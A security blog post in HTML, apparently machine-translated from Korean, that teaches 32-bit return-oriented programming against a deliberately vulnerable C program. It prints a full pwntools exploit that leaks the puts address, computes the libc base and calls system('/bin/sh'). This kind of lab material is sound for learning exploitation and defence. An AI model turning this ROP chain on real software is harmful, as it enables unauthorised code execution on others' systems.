@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] ROP 32bit · whrds.log</title><meta name="description" content="※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ For ROP, we’ve never mentioned some time before. Return-Oriented Programming is a method to bypass ASLR, which is one of the attacks to perform by reconfiguring functions using gadget. ROP 32">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-rop-32bit/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rop-32bit/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rop-32bit/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] ROP 32bit · whrds.log"><meta property="og:description" content="※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ For ROP, we’ve never mentioned some time before. Return-Oriented Programming is a method to bypass ASLR, which is one of the attacks to perform by reconfiguring functions using gadget. ROP 32"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-rop-32bit/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] ROP 32bit","description":"※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ For ROP, we’ve never mentioned some time before. Return-Oriented Programming is a method to bypass ASLR, which is one of the attacks to perform by reconfiguring functions using gadget. ROP 32","datePublished":"2023-12-01","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-rop-32bit/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-rop-32bit/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] ROP 32bit</h1><p class="article-description">※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ For ROP, we’ve never mentioned some time before. Return-Oriented Programming is a method to bypass ASLR, which is one of the attacks to perform by reconfiguring functions using gadget. ROP 32</p><div class="article-meta"><time datetime="2023-12-01">Dec 1, 2023</time><span>·</span><span>3 min read</span></div></header><div class="prose"><p>**※ Please tell us if there is a wrong part. We will fix it after confirmation. *****</p>
+<p>We’ve never mentioned some time before ROP.</p>
+<p>Return-Oriented Programming</p>
+<p>It is a technique to bypass ASLR, one of the memory protection methods.</p>
+<p>ROP has a slight difference in how to attack in 32-bit and 64-bit environments.</p>
+<p>The 32-bit uses a stack, but the 64-bit is called a function call that uses a register and stack.</p>
+<p>First, let’s go about 32-bit ROP.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main(){
+	char input[0x50];
+	puts(&quot;Hello! Whrd &quot;);
+
+	read(0,input,0x100);
+	return 0 ;
+}
+</code></pre>
+<p>It’s a very simple example that I’ve seen before.</p>
+<p>The process to perform attacks is similar to RTL-Chaining.</p>
+<p>The difference is that ROP will find the address of libc\ base to bypass ASLR.</p>
+<p>Click here to view the attack scenario.</p>
+<p>1. libc\ base</p>
+<p>2. Getting Started</p>
+<p>This two processes are done in multiple ways.</p>
+<p>I’m going to look back and look at the example above.</p>
+<p>! <a href="/assets/images/tistory/tistory-a06ebd940643/001.png"></a></p>
+<p>32-bit compiler environment and protection laws are all off.</p>
+<p>If so, it means that you don’t need to leak the canary to perform the attack or do other things.</p>
+<p>How to get libc\ base? ?</p>
+<p>The answer is to output the real address of the function that got is pointed.</p>
+<p>In the morning example code, the output number is puts.</p>
+<p>If you use this function, you can perform attacks.</p>
+<p>In this case, the 32-bit to use the gadget will pass the argument only using the stack.</p>
+<p>In other words, it is possible to attack even if you use some gadgets in using pop-ret gadgets.</p>
+<p>! <a href="/assets/images/tistory/tistory-a06ebd940643/002.png"></a></p>
+<p>The size of the buffer is 0x54 and you need to add sfp to the total 0x58 stack.</p>
+<p>I want to configure the chain now.</p>
+<p>As we said, we will deliver the argument through the stack.</p>
+<p>func is running first and the gadget is entered to meet the number of arguments.</p>
+<p>If you enter the value in your stack,</p>
+<p>The argument is delivered to func and is excluded from the stack by the gadget.</p>
+<pre><code>payload = b'A'*0x54
+payload += b'B'*0x4
+
+payload += p32(puts_plt)
+payload += p32(pr)
+payload += p32(puts_got)
+</code></pre>
+<p>can be configured as above.</p>
+<p>From now, each person has different ways.</p>
+<p>Here is a way to calculate the value as p.recv, and perform the attack.</p>
+<p>ret to main</p>
+<p>We use a lot of ways to return to the main function, so we will explain it in this way.</p>
+<p>If you find the real address of puts through the code above, how should I do? ?</p>
+<p>You need to calculate libc\ base by using the offset of puts.</p>
+<pre><code>puts_got = e.got['puts']
+puts_plt = e.plt['puts']
+main = e.sym['main']
+
+ret = 0x0804900e
+pr = 0x08049196
+
+payload = b'A'*0x54
+payload += b'B'*0x4
+
+payload += p32(puts_plt)
+payload += p32(pr)
+payload += p32(puts_got)
+
+payload += p32(main)
+
+pause()
+p.sendafter(b'Whrd', payload)
+
+p.recvn(2)
+libc_base = u32(p.recvn(4)) - libc.sym['puts']
+print('libc_base = ',hex(libc_base))
+</code></pre>
+<p>If you show the code first, it seems like above.</p>
+<p>The libc file contains the offset of all functions.</p>
+<p>! <a href="/assets/images/tistory/tistory-a06ebd940643/003.png"></a></p>
+<p>libc file /lib/i386-linux-gnu/libc.so.6</p>
+<p>Please check the file.</p>
+<p>! <a href="/assets/images/tistory/tistory-a06ebd940643/004.png"></a></p>
+<p>You can see that the address is not in offset format.</p>
+<p>If you look at the code, you can save libc\ base if you get the offset in the real address of the leaked puts.</p>
+<p>Configuring system(‘/bin/sh\x00’); based on the old code.</p>
+<p>Here is a way to use the bss area or find the address itself of the string.</p>
+<p>We will handle the way of the latter.</p>
+<pre><code>system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+payload = b'A'*0x54
+payload += b'B'*0x4
+
+payload += p32(system)
+payload += p32(pr)
+payload += p32(binsh)
+
+p.sendafter(b'Whrd', payload)
+</code></pre>
+<p>All payloads are as follows:</p>
+<pre><code>from pwn import *
+
+p = process('./rop32')
+e = ELF('./rop32')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+##############################################
+
+puts_got = e.got['puts']
+puts_plt = e.plt['puts']
+main = e.sym['main']
+
+ret = 0x0804900e
+pr = 0x08049196
+
+############### stage 1 : libc_base###########
+
+payload = b'A'*0x54
+payload += b'B'*0x4
+
+payload += p32(puts_plt)
+payload += p32(pr)
+payload += p32(puts_got)
+
+payload += p32(main)
+
+pause()
+p.sendafter(b'Whrd', payload)
+
+p.recvn(2)
+libc_base = u32(p.recvn(4)) - libc.sym['puts']
+print('libc_base = ',hex(libc_base))
+
+############### stage 2 : attack   ###########
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+payload = b'A'*0x54
+payload += b'B'*0x4
+
+payload += p32(system)
+payload += p32(pr)
+payload += p32(binsh)
+
+p.sendafter(b'Whrd', payload)
+
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-rop-32bit/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
